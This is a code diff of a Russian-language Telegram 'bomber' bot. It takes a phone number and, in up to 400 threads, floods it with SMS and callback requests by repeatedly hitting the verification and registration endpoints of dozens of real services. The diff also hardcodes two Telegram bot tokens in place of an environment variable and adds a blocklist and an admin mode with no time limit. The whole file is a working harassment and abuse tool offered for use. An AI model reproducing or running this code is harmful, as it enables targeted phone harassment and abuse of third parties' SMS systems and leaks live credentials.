@@ -1,20 +1,22 @@
+
+# -*- coding: utf-8 -*-
 import requests
 import threading
-import telebot
-import telebot as telebot
-from telebot import TeleBot
-import random, datetime, time
 from datetime import datetime, timedelta
-from random import choice
-import os
+from telebot import TeleBot
+import telebot
+import time
+import random
 
-TOKEN = os.environ.get('BOT_TOKEN')
+TOKEN = '1029502739:AAGLuLgiRv53SBIEDumXATFcD7ctC-ZvVmc'
 
-THREADS_LIMIT = 10
+THREADS_LIMIT = 400
 
 chat_ids_file = 'chat_ids.txt'
-admin = 947353888
+
 ADMIN_CHAT_ID = 947353888
+owner = 947353888
+TOKEN = '1090200914:AAFUPmgNU596Rv6ki_nRh-uICCk3xbgUfxA'
 
 users_amount = [0]
 threads = list()
@@ -23,21 +25,10 @@ types = telebot.types
 bot = TeleBot(TOKEN)
 running_spams_per_chat_id = []
 
-agents_list = (
-    'Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36',
-    'Mozilla/5.0 (Linux; Android 6.0; HTC One X10 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.98 Mobile Safari/537.36',
-    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.12 Safari/537.36 OPR/14.0.1116.4',
-    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36 OPR/32.0.1948.25',
-    'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.77 Safari/537.36 Vivaldi/1.7.735.27'
-    )
-# Usage: request.post(---, headers=random_agent())
-def random_agent():
-    return {'User-Agent': choice(agents_list)}
-
 def save_chat_id(chat_id):
     "Функция добавляет чат айди в файл если его там нету"
     chat_id = str(chat_id)
-    with open(chat_ids_file, "a+") as ids_file:
+    with open(chat_ids_file,"a+") as ids_file:
         ids_file.seek(0)
 
         ids_list = [line.split('\n')[0] for line in ids_file]
@@ -53,6 +44,7 @@ def save_chat_id(chat_id):
 
 
 def send_message_users(message):
+
     def send_message(chat_id):
         data = {
             'chat_id': chat_id,
@@ -64,6 +56,7 @@ def send_message_users(message):
         ids_list = [line.split('\n')[0] for line in ids_file]
 
     [send_message(chat_id) for chat_id in ids_list]
+    bot.send_message(ADMIN_CHAT_ID, f"сообщение успешно отправлено всем ({users_amount[0]}) пользователям бота!")
 
 
 @bot.message_handler(commands=['start'])
@@ -88,55 +81,24 @@ def start(message):
 
     save_chat_id(message.chat.id)
 
+iteration = 0
+_name = ''
+for x in range(12):
+    _name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
+    password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
+    username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
 
-def start_spam(chat_id, phone_number, force):
-    running_spams_per_chat_id.append(chat_id)
-
-    if force:
-        msg = f'Спам запущен на неограниченое время для номера +{phone_number}!'
-    else:
-        msg = f'Спам запущен на номер +{phone_number}!'
-
-    bot.send_message(chat_id, msg)
-    end = datetime.now() + timedelta(minutes=5)
-    while (datetime.now() < end) or (force and chat_id == ADMIN_CHAT_ID):
-        if chat_id not in running_spams_per_chat_id:
-            break
-        if phone_number[0] == '3' and phone_number[1] == '8':
-            send_for_number_ua(phone_number)
-            random_agent()
-        elif phone_number[0] == '+':
-            send_for_number_ru(phone_number)
-            random_agent()
-        else:
-            pass
-    bot.send_message(chat_id, f'Спам атака на номер {phone_number} завершён!')
-    THREADS_AMOUNT[0] -= 1  # стояло 1
-    try:
-        running_spams_per_chat_id.remove(chat_id)
-    except Exception:
-        pass
-
-def send_for_number_ru(_phone):
-    _name = ''
-    for x in range(12):
-        _name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
-        password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
-        username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
-
-    _phone9 = _phone[1:]
-    _phoneAresBank = '+' + _phone[0] + '(' + _phone[1:4] + ')' + _phone[4:7] + '-' + _phone[7:9] + '-' + _phone[9:11]
-    _phone9dostavista = _phone9[:3] + '+' + _phone9[3:6] + '-' + _phone9[6:8] + '-' + _phone9[8:10]
-    _phoneOstin = '+' + _phone[0] + '+(' + _phone[1:4] + ')' + _phone[4:7] + '-' + _phone[7:9] + '-' + _phone[9:11]
-    _phonePizzahut = '+' + _phone[0] + ' (' + _phone[1:4] + ') ' + _phone[4:7] + ' ' + _phone[7:9] + ' ' + _phone[9:11]
-    _phoneGorzdrav = _phone[1:4] + ') ' + _phone[4:7] + '-' + _phone[7:9] + '-' + _phone[9:11]
-
-    iteration = 0
-    
-    while True:
-
+def send_for_number(phone):
+        request_timeout = 0.00001
         _email = _name+f'{iteration}'+'@gmail.com'
         email = _name+f'{iteration}'+'@gmail.com'
+        _phone = phone
+        _phone9 = _phone[1:]
+        _phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] #+7+(915)350-99-08
+        _phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10] #915+350-99-08
+        _phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] # '+7+(915)350-99-08'
+        _phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11] # '+7 (915) 350 99 08'
+        _phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] # '915) 350-99-08'
         try:
             requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
             print('[+] Grab отправлено!')
@@ -395,6 +357,7 @@ def send_for_number_ru(_phone):
             print('[+] CabWiFi отправлено!')
         except:
             print('[-] Не отправлено!')
+
         try:
             requests.post("https://api.wowworks.ru/v2/site/send-code",json={"phone": _phone, "type": 2})
             print('[+] wowworks отправлено!')
@@ -431,194 +394,216 @@ def send_for_number_ru(_phone):
         except:
             print('[-] Не отправлено!')
 
-
-
         try:
-            iteration += 1
-            print(('{} круг пройден.').format(iteration))
+            requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": _phone})
         except:
-            break
+            pass
 
-def send_for_number_ua(_phone):
-    _name = ''
-    for x in range(12):
-        _name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
-        password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
-        username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
-    stanPass = "kobalado2013"
-
-    _phone9 = _phone[1:]
-    _phoneAresBank = '+' + _phone[0] + '(' + _phone[1:4] + ')' + _phone[4:7] + '-' + _phone[7:9] + '-' + _phone[9:11]
-    _phone9dostavista = _phone9[:3] + '+' + _phone9[3:6] + '-' + _phone9[6:8] + '-' + _phone9[8:10]
-    _phoneOstin = '+' + _phone[0] + '+(' + _phone[1:4] + ')' + _phone[4:7] + '-' + _phone[7:9] + '-' + _phone[9:11]
-    _phonePizzahut = '+' + _phone[0] + ' (' + _phone[1:4] + ') ' + _phone[4:7] + ' ' + _phone[7:9] + ' ' + _phone[9:11]
-    _phoneGorzdrav = _phone[1:4] + ') ' + _phone[4:7] + '-' + _phone[7:9] + '-' + _phone[9:11]
-    iteration = 0
-    while True:
-        _email = _name + f'{iteration}' + '@gmail.com'
-        email = _name + f'{iteration}' + '@gmail.com'
-        _nameRu = 'Гоша'
         try:
-            requests.post('https://tehnosvit.ua/iwantring_feedback.html',
-                          data={'feedbackName': _name, 'feedbackPhone': '+' + _phone})
+            requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate',json={"phone": _phone})
+        except:
+            pass
+
+        try:
+            requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword", data={"password": 'Porno22!', "application": "lkp", "login": "+" + _phone})
+        except:
+            pass
+
+        try:
+            requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",data={"mode": "request", "phone": "+" + _phone,"phone_permission": "unknown", "stream_id": 0, "v": 3, "appversion": "3.20.6","osversion": "unknown", "devicemodel": "unknown"})
+        except:
+            pass
+
+        try:
+            requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
+        except:
+            pass
+
+        try:
+            requests.post("https://guru.taxi/api/v1/driver/session/verify",json={"phone": {"code": 1, "number": _phone}})
+        except:
+            pass
+
+        try:
+            requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
+        except:
+            pass
+
+        try:
+            requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
+        except:
+            pass
+
+        try:
+            requests.post("https://api.carsmile.com/",json={"operationName": "enterPhone", "variables": {"phone": _phone},"query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
+        except:
+            pass
+
+        try:
+            requests.post('https://belkacar.ru/get-confirmation-code',data={'phone': _phone})
+        except:
+            pass
+
+        try:
+            requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
+        except:
+            pass
+
+        try:
+            requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data={"phone": _phone})
+        except:
+            pass
+
+        try:
+            requests.post('https://pampik.com/callback', data={'phoneCallback':_phone})
+            print('[+] Pampik отправлено!')
+        except:
+            print('[-] Pampik Не отправлено!')
+
+        try:
+            requests.post('https://tehnosvit.ua/iwantring_feedback.html', data={'feedbackName':_name,'feedbackPhone':'+'+_phone})
             print('[+] Tehnosvit отправлено!')
-            time.sleep(0.1)
         except:
             print('[-] Tehnosvit Не отправлено!')
 
         try:
-            requests.post('https://mobileplanet.ua/register',
-                          data={'klient_name': _nameRu, 'klient_phone': '+' + _phone, 'klient_email': _email})
+            requests.post('https://mobileplanet.ua/register', data={'klient_name':_nameRu,'klient_phone':'+'+_phone,'klient_email':_email})
             print('[+] Mobileplanet отправлено!')
-            time.sleep(0.1)
         except:
             print('[-] Mobileplanet Не отправлено!')
 
         try:
-            requests.post('https://e-vse.online/mail2.php', data={'telephone': '+' + _phone})
+            requests.post('https://e-vse.online/mail2.php', data={'telephone':'+'+_phone})
             print('[+] E-vse отправлено!')
-            time.sleep(0.1)
         except:
             print('[-] E-vse Не отправлено!')
 
         try:
-            requests.post('https://protovar.com.ua/aj_record',
-                          data={'object': 'callback', 'user_name': _nameRu, 'contact_phone': _phone[3:]})
+            requests.post('https://protovar.com.ua/aj_record', data={'object':'callback','user_name':_nameRu,'contact_phone':_phone[3:]})
             print('[+] Protovar отправлено!')
-            time.sleep(0.1)
         except:
             print('[-] Protovar Не отправлено!')
 
         try:
-            requests.post('https://kasta.ua/api/v2/login/', data={"phone": _phone})
+            requests.post('https://kasta.ua/api/v2/login/', data={"phone":_phone})
             print('[+] Kasta отправлено!')
-            time.sleep(0.1)
         except:
             print('[-] Kasta Не отправлено!')
 
         try:
-            requests.post('https://allo.ua/ua/customer/account/createPostVue/?currentTheme=main&currentLocale=uk_UA',
-                          data={'firstname': _name, 'telephone': _phone[2:], 'email': _email, 'password': password,
-                                'form_key': 'Zqqj7CyjkKG2ImM8'})
+            requests.post('https://allo.ua/ua/customer/account/createPostVue/?currentTheme=main&currentLocale=uk_UA', data={'firstname':_name, 'telephone':_phone[2:], 'email':_email,'password':password,'form_key':'Zqqj7CyjkKG2ImM8'})
             print('[+] ALLO отправлено!')
-            time.sleep(0.1)
         except:
             print('[-] ALLO Не отправлено!')
 
         try:
-            requests.post('https://secure.online.ua/ajax/check_phone/?reg_phone=%2B' + _phone[0:7] + '-' + _phone[8:11])
+            requests.post('https://secure.online.ua/ajax/check_phone/?reg_phone=%2B'+_phone[0:7]+'-'+_phone[8:11])
             print('[+] OnloneUA отправлено!')
-            time.sleep(0.1)
         except:
             print('[-] OnloneUA Не отправлено!')
 
         try:
             requests.post('https://707taxi.com.ua/sendSMS.php', data={'tel': _phone[3:]})
             print('[+] 707taxis отправлено!')
-            time.sleep(0.1)
         except:
             print('[-] 707taxis Не отправлено!')
 
         try:
-            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
-                          data={'phone_number': _phone}, headers={})
+            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
             print('[+] Tinder отправлено!')
-            time.sleep(0.1)
         except:
             print('[-] Tinder Не отправлено!')
 
         try:
-            requests.post('https://comfy.ua/ua/customer/account/createPost',
-                          data={'registration_name': _name, 'registration_phone': _phone[2:],
-                                'registration_email': _email})
+            requests.post('https://comfy.ua/ua/customer/account/createPost', data={'registration_name':_name,'registration_phone':_phone[2:],'registration_email':_email})
             print('[+] Comfy отправлено!')
-            time.sleep(0.1)
         except:
             print('[-] Comfy Не отправлено!')
 
         try:
-            requests.post('https://www.sportmaster.ua/?module=users&action=SendSMSReg&phone=+38%20(050)%20669-16-10',
-                          data={"result": "ok"})
+            requests.post('https://www.sportmaster.ua/?module=users&action=SendSMSReg&phone=+38%20(050)%20669-16-10', data={"result":"ok"})
             print('[+] Sportmaster отправлено!')
-            time.sleep(0.1)
         except:
-            print('[-] Sportmaster Не отправлено!')
-
+              print('[-] Sportmaster Не отправлено!')
+            
         try:
             requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
             print('[+] Beltelcom отправлено!')
-            time.sleep(0.1)
         except:
             print('[-] Beltelcom Не отправлено!')
 
         try:
-            requests.post('https://my.citrus.ua/api/v2/register',
-                          data={"email": _email, "name": _name, "phone": _phone[2:], "password": stanPass,
-                                "confirm_password": stanPass})
+            requests.post('https://my.citrus.ua/api/v2/register',data={"email":_email,"name":_name,"phone":_phone[2:],"password":stanPass,"confirm_password":stanPass})
             print('[+] Citrus отправлено!')
-            time.sleep(0.1)
         except:
             print('[-] Citrus Не отправлено!')
 
         try:
-            requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": _phone})
+            requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": _phone})
             print('[+] IVI отправлено!')
-            time.sleep(0.1)
         except:
             print('[-] IVI Не отправлено!')
 
         try:
-            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
-                          data={'phone_number': _phone})
+            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',data={'phone_number': _phone})
             print('[+] Tinder отправлено!')
-            time.sleep(0.1)
         except:
             print('[-] Tinder Не отправлено!')
 
         try:
-            requests.post('https://passport.twitch.tv/register?trusted_request=true',
-                          json={"birthday": {"day": 11, "month": 11, "year": 1999},
-                                "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,
-                                "password": password, "phone_number": _phone, "username": username})
+            requests.post('https://passport.twitch.tv/register?trusted_request=true',json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": _phone,"username": username})
             print('[+] Twitch отправлено!')
-            time.sleep(0.1)
         except:
             print('[-] Twitch Не отправлено!')
 
         try:
-            requests.post('https://www.nl.ua',
-                          data={'component': 'bxmaker.authuserphone.login',
-                                'sessid': 'bf70db951f54b837748f69b75a61deb4',
-                                'method': 'sendCode', 'phone': _phone, 'registration': 'N'})
+            requests.post('https://www.nl.ua', data={'component':'bxmaker.authuserphone.login', 'sessid':'bf70db951f54b837748f69b75a61deb4', 'method':'sendCode','phone':_phone,'registration':'N'})
             print('[+] NovaLinia отправлено!')
-            time.sleep(0.1)
         except:
             print('[-] NovaLinia Не отправлено!')
 
-        try:
-            iteration += 1
-            print(('{} круг пройден.').format(iteration))
-            print('Возникли вопросы? Пишите разработчику в телеграм [ --> @artem2424 <-- ]')
-            time.sleep(0.1)
-        except:
+
+
+def start_spam(chat_id, phone_number, force):
+    running_spams_per_chat_id.append(chat_id)
+
+    with open("idBL.txt") as file:
+        arrayBL = [row.strip() for row in file]
+        iduser = f'{chat_id}'
+    if iduser in arrayBL:
+        bot.send_message(chat_id, ".", parse_mode="HTML")
+    else:
+        msg = f'Спам на номер: {phone_number}\n запущен'
+        # bot.send_message(ADMIN_CHAT_ID, f"{message.chat.first_name} {message.chat.last_name} отправил спам на {phone_number}", parse_mode='HTML')
+
+
+    bot.send_message(chat_id, msg)
+    end = datetime.now() + timedelta(minutes = 10)
+    while (datetime.now() < end) or (force and chat_id==ADMIN_CHAT_ID):
+        if chat_id not in running_spams_per_chat_id:
             break
+        send_for_number(phone_number)
+    bot.send_message(chat_id, f'Спам на номер {phone_number} завершён')
+    THREADS_AMOUNT[0] -= 1 # стояло 1
+    try:
+        running_spams_per_chat_id.remove(chat_id)
+    except Exception:
+        pass
 
 
 def spam_handler(phone, chat_id, force):
     if int(chat_id) in running_spams_per_chat_id:
-        bot.send_message(chat_id,
-                         '!Вы уже начали рассылку спама. Дождитесь окончания или нажмите Стоп Спам и поробуйте снова!')
+        bot.send_message(chat_id, 'Вы уже создали запрос на спам\n Чтобы отключить спам-атаку "Отключить"')
         return
 
-    # Если количество тредов меньше максимального создается новый который занимается спамом
     if THREADS_AMOUNT[0] < THREADS_LIMIT:
         x = threading.Thread(target=start_spam, args=(chat_id, phone, force))
         threads.append(x)
         THREADS_AMOUNT[0] += 1
         x.start()
     else:
-        bot.send_message(chat_id, '!Сервера сейчас перегружены. Попытайтесь снова через несколько минут!')
-        print('Максимальное количество тредов исполняется. Действие отменено.!')
+        bot.send_message(chat_id, 'Сервера сейчас перегружены. Попытайтесь снова через несколько минут.')
+        print('Host F')
 
 
 @bot.message_handler(content_types=['text'])
@@ -626,33 +611,40 @@ def handle_message_received(message):
     chat_id = int(message.chat.id)
     text = message.text
 
-    if text == 'Информация':
-        bot.send_message(chat_id, '❤️Возникли проблемы? - @viannedi \n Чат элиты - @VV2_Chat \n Спумера создал - @artem2424')
+    if text == '️Информация':
+        bot.send_message(chat_id, '❤️Возникли проблемы? - @viannedi \n Чат элиты - @VV2_Chat \n Спумера создал - @artem2424', parse_mode='HTML')
+
     elif text == 'Бомбер':
-        bot.send_message(chat_id,
-                         'Введите номер в формате:\n🇺🇦 380xxxxxxxxx\n🇷🇺 7xxxxxxxxxx\n')
-    elif text == 'Соглашение':
-        bot.send_message(chat_id,
-                         'Проходя регестрацию в боте вы соглашаетесь с данными правилами! - https://telegra.ph/FAQ-02-02-5')
+        bot.send_message(chat_id, 'Введите номер без + в формате:\n🇺🇦 380xxxxxxxxx\n🇷🇺 79xxxxxxxxx\n🇰🇿 77xxxxxxxxx')
 
     elif text == 'Статистика':
-        bot.send_message(chat_id,
-                         f'Пользователей🙎‍♂: {users_amount[0]}\n Возникли проблемы? - @viannedi')
+        bot.send_message(chat_id, f'Пользователей🙎‍♂: {users_amount[0]}\n Возникли проблемы? - @viannedi', parse_mode='HTML')
 
-    elif text == 'Рассылка' and chat_id == ADMIN_CHAT_ID:
+    elif text == 'Рассылка' and chat_id==ADMIN_CHAT_ID:
         bot.send_message(chat_id, 'Введите сообщение в формате: "РАЗОСЛАТЬ: ваш_текст" без кавычек')
 
 
-    elif text == 'Помощь':
-        bot.send_message(chat_id, 'Помощь - список команд\n Бомбер - запустить бомбер \n Отключить - отключить бомбер \n Информация - о боте \n\n ❤️ Возникли проблемы? - @viannedi')
+    elif text == 'Соглашение':
+
+        bot.send_message(chat_id, 'Проходя регестрацию в боте вы соглашаетесь с данными правилами! - https://telegra.ph/FAQ-02-02-5')
+
     elif text == 'Отключить':
         if chat_id not in running_spams_per_chat_id:
-            bot.send_message(chat_id, 'Ты еще ничего не начинал, чтобы заканчивать -_-')
+            bot.send_message(chat_id, 'Вы еще не начинали спам')
         else:
             running_spams_per_chat_id.remove(chat_id)
-            bot.send_message(chat_id, 'Спам на указанный номер, отключен😢')
-    elif 'РАЗОСЛАТЬ: ' in text and chat_id == ADMIN_CHAT_ID:
-        msg = text.replace("РАЗОСЛАТЬ: ", "")
+
+    elif text == 'Помощь':
+        bot.send_message(chat_id, 'Помощь - список команд\n Бомбер - запустить бомбер \n Отключить - отключить бомбер \n Информация - о боте \n\n ❤️ Возникли проблемы? - @viannedi')
+
+    elif text == 'Заблокировать':
+        addbl(message)
+
+    elif text == 'Разблокировать':
+        delbl(message)
+
+    elif 'РАЗОСЛАТЬ: ' in text and chat_id==ADMIN_CHAT_ID:
+        msg = text.replace("РАЗОСЛАТЬ: ","")
         send_message_users(msg)
 
     elif len(text) == 11:
@@ -666,15 +658,14 @@ def handle_message_received(message):
 
 
 
-    elif len(text) == 12 and chat_id == ADMIN_CHAT_ID and text[0] == '_':
+    elif len(text) == 12 and chat_id==ADMIN_CHAT_ID and text[0]=='_':
         phone = text[1:]
-        bot.send_message(chat_id, 'admin!')
         spam_handler(phone, chat_id, force=True)
 
     else:
         bot.send_message(chat_id, f'Номер введен неправильно. Введено {len(text)} символов, ожидается 11')
         print(f'Номер введен неправильно. Введено {len(text)} символов, ожидается 11')
 
-
 if __name__ == '__main__':
     bot.polling(none_stop=True)
+ 
